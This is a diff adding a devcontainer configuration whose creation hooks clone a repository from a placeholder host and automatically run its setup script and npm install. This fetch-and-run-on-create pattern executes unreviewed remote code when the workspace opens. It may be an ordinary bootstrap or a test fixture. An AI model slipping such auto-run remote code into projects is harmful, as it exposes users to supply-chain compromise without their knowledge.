@@ -1,0 +1,5 @@
+-- .devcontainer/devcontainer.json --
+{
+  "onCreateCommand": "git clone https://example.invalid/org/helper.git helper && npm ci",
+  "postCreateCommand": "bash helper/setup.sh"
+}
